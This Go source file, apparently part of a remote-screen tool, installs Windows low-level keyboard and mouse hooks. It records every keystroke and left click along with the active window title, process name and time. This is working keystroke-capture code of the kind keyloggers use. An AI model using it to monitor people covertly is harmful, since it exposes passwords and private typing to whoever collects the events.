package keyboard

import (
	"RemoteWebScreen/win32"
	"log"
	"time"
	"unsafe"
)

type KBEvent struct {
	VkCode      win32.DWORD
	ProcessId   uint32
	ProcessName string
	WindowText  string
	Time        time.Time
}

type MSEvent struct {
	Point       win32.POINT
	ProcessId   uint32
	ProcessName string
	WindowText  string
	Time        time.Time
}

var (
	acp           uint
	windowText    string
	processId     uint32
	processName   string
	kbEventChanel = make(chan KBEvent, 200)
	msEventChanel = make(chan MSEvent, 200)
)

var keyMap = map[win32.DWORD]string{
	8: "Backspace", 9: "Tab", 13: "Enter", 20: "CapsLock", 27: "Esc",

	32: "Space", 33: "PageUp", 34: "PageDown", 35: "End", 36: "Home", 37: "Left", 38: "Up", 39: "Right",
	40: "Down", 45: "Insert", 46: "Delete",

	48: "0", 49: "1", 50: "2", 51: "3", 52: "4", 53: "5", 54: "6", 55: "7", 56: "8", 57: "9",

	65: "a", 66: "b", 67: "c", 68: "d", 69: "e", 70: "f", 71: "g", 72: "h", 73: "i", 74: "j",
	75: "k", 76: "l", 77: "m", 78: "n", 79: "o", 80: "p", 81: "q", 82: "r", 83: "s", 84: "t",
	85: "u", 86: "v", 87: "w", 88: "x", 89: "y", 90: "z",

	91: "Win", 92: "Win",
	96: "0", 97: "1", 98: "2", 99: "3", 100: "4", 101: "5", 102: "6", 103: "7", 104: "8", 105: "9",
	106: "*", 107: "+", 109: "-", 110: ".", 111: "/",

	112: "F1", 113: "F2", 114: "F3", 115: "F4", 116: "F5", 117: "F6", 118: "F7", 119: "F8",
	120: "F9", 121: "F10", 122: "F11", 123: "F12",

	144: "NumLock", 160: "Shift", 161: "Shift", 162: "Ctrl", 163: "Ctrl",
	164: "Alt", 165: "Alt",

	186: ";", 187: "=", 188: ",", 189: "-", 190: ".", 191: "/", 192: "`",
	219: "[", 220: "\\", 221: "]", 222: "'",
}

var exKey = map[win32.DWORD]struct{}{
	8: {}, 9: {}, 13: {}, 20: {}, 27: {},

	32: {}, 33: {}, 34: {}, 35: {}, 36: {}, 37: {}, 38: {}, 39: {}, 40: {},
	45: {}, 46: {},

	91: {}, 92: {},

	112: {}, 113: {}, 114: {}, 115: {}, 116: {}, 117: {}, 118: {}, 119: {},
	120: {}, 121: {}, 122: {}, 123: {},

	144: {}, 160: {}, 161: {}, 162: {}, 163: {},
	164: {}, 165: {},
}

func init() {
	var err error
	var hWnd win32.HWND
	acp, err = win32.GetACP()
	if err != nil {
		log.Fatal(err)
	}
	hWnd, windowText, err = getForegroundWindow()
	if err != nil {
		log.Fatal(err)
	}
	processId, processName, err = getProcessInfo(hWnd)
	if err != nil {
		log.Fatal(err)
	}
}

// kb
func keyboardCallBack(nCode int, wParam win32.WPARAM, lParam win32.LPARAM) win32.LRESULT {

	if int(wParam) == win32.WM_KEYDOWN { //down
		kbd := (*win32.KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		hwn, wt, err := getForegroundWindow()
		if err != nil {
			log.Println(err)
		}
		if windowText != wt {
			windowText = wt
			processId, processName, err = getProcessInfo(hwn)
			if err != nil {
				log.Println(err)
			}
		}
		kbEventChanel <- KBEvent{
			VkCode:      kbd.VkCode,
			WindowText:  windowText,
			ProcessName: processName,
			ProcessId:   processId,
			Time:        time.Now(),
		}
	}
	res, _ := win32.CallNextHookEx(win32.Jianpan_hok, nCode, wParam, lParam)
	return res
}

// mouse
func mouseCallBack(nCode int, wParam win32.WPARAM, lParam win32.LPARAM) win32.LRESULT {
	if int(wParam) == win32.WM_LBUTTONDOWN { // 左击
		ms := (*win32.MSLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		msEventChanel <- MSEvent{
			Point:       ms.Pt,
			WindowText:  windowText,
			ProcessName: processName,
			ProcessId:   processId,
			Time:        time.Now(),
		}
	}
	res, _ := win32.CallNextHookEx(win32.Shubao_hok, nCode, wParam, lParam)
	return res
}
